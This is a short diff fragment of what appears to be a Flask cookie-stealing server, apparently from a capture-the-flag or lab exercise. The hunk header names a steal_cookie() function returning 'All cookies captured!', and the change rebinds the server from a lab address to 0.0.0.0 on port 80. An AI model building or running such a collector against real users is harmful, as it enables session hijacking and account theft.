@@ -23,4 +23,4 @@ def steal_cookie():
     return 'All cookies captured!', 200
 
 if __name__ == '__main__':
-    app.run(host="10.10.14.3",port=80,debug=True)
+    app.run(host="0.0.0.0",port=80,debug=True)
